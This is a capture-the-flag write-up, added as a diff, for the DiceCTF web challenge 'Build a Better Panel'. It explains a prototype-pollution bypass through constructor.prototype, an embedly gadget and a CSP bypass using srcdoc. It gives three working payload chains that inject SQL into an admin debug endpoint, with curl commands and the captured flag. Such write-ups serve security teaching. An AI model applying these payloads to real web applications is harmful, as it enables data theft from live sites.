@@ -1,0 +1,106 @@
+Difference From Build a Panel
+1. The panelId cookie is sameSite: 'strict' instead of 'lax'
+2. The admin bot only goes to ^https:\/\/build-a-better-panel\.dicec\.tf\/create\?[0-9a-z\-\=]+$
+E.g. https://build-a-better-panel.dicec.tf/create?test
+
+## app/server.js
+app.get('/create', (req, res) => {
+    const cookies = req.cookies;
+    const queryParams = req.query;
+
+    if(!cookies['panelId']){
+        const newPanelId = queryParams['debugid'] || uuidv4();
+    
+        res.cookie('panelId', newPanelId, {maxage: 10800, httponly: true, sameSite: 'strict'});
+    }
+
+    res.redirect('/panel/');
+});
+
+
+Specify `debugid`
+
+
+## app/public/cusotm.js
+const mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];
+
+const safeDeepMerge = (target, source) => {
+    for (const key in source) {
+        if(!mergableTypes.includes(typeof source[key]) && !mergableTypes.includes(typeof target[key])){
+            if(key !== '__proto__'){
+                safeDeepMerge(target[key], source[key]);
+            }
+        }else{
+            target[key] = source[key];
+        }
+    }
+}
+
+const displayWidgets = async () => {
+    const userWidgets = await (await fetch('/panel/widgets', {method: 'post', credentials: 'same-origin'})).json();
+    let toDisplayWidgets = {'welcome back to build a panel!': {'type': 'welcome'}};
+
+    safeDeepMerge(toDisplayWidgets, userWidgets);
+    ...
+
+
+Prototype Pollution Vulnerability
+	We can bypass the __proto__ check in safeDeepMerge by using constructor.prototype instead, which is the same thing.
+
+
+    {}.__proto__ = Object.prototype
+    ({}).constructor equals to Object, so ({}).constructor.prototype is Object.prototype
+
+Gadget:
+	https://cdn.embedly.com/widgets/platform.js
+
+	Source:
+		https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md
+
+############## Solution 1 ##############
+
+CSP
+	default-src 'none';
+    script-src 'self' http://cdn.embedly.com/; 
+    style-src 'self' http://cdn.embedly.com/; 
+    connect-src 'self' https://www.reddit.com/comments/;
+
+	Try
+		data = {"prototype": {"css": sql_url()}}
+
+python3 pollute.py
+	https://build-a-better-panel.dicec.tf/create?debugid=l3ooo
+
+Send payload to Admin bot
+
+curl -X POST https://build-a-better-panel.dicec.tf/panel/widgets -b "panelId=l3ooo"
+	{"constructor":{"prototype":{"css":"https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=l3ooo&widgetname=l3o_widget&widgetdata=%22%27%20%7C%7C%20%28SELECT%20%2A%20FROM%20flag%29%20%7C%7C%20%27%22"}},"l3o_widget":"dice{un1n73nd3d_54d_1n73nd3d_h4ppy}"}
+
+
+############## Solution 2 ##############
+
+Bypass CSP with srcdoc (style-src 'self')
+    prototype: {
+        srcdoc: `<link rel=stylesheet href="https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=xof5566no1'%2C%20(select%20flag%20from%20flag%20limit%201)%2C%20'1')%3B--&widgetname=1&widgetdata=1"></link>`
+    }
+
+python3 pollute.py
+    https://build-a-better-panel.dicec.tf/create?debugid=l3oooo
+
+
+curl -X POST https://build-a-better-panel.dicec.tf/panel/widgets -b "panelId=l3oooo"
+    {"constructor":{"prototype":{"srcdoc":"<link rel=stylesheet href=\"https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=l3oooo&widgetname=l3o_widget&widgetdata=%22%27%20%7C%7C%20%28SELECT%20%2A%20FROM%20flag%29%20%7C%7C%20%27%22\"></link>"}},"l3o_widget":"dice{un1n73nd3d_54d_1n73nd3d_h4ppy}"}
+
+############## Solution 3 ##############
+
+Bypass CSP with srcdoc (script-src 'self')
+    "prototype": {
+        "srcdoc": "<script src=\""+sql_url()+"\"></script>"
+    }
+
+
+python3 pollute.py
+    https://build-a-better-panel.dicec.tf/create?debugid=l3ooooo
+
+curl -X POST https://build-a-better-panel.dicec.tf/panel/widgets -b "panelId=l3ooooo"
+    {"constructor":{"prototype":{"srcdoc":"<script src=\"https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=l3ooooo&widgetname=l3o_widget&widgetdata=%22%27%20%7C%7C%20%28SELECT%20%2A%20FROM%20flag%29%20%7C%7C%20%27%22\"></script>"}},"l3o_widget":"dice{un1n73nd3d_54d_1n73nd3d_h4ppy}"}
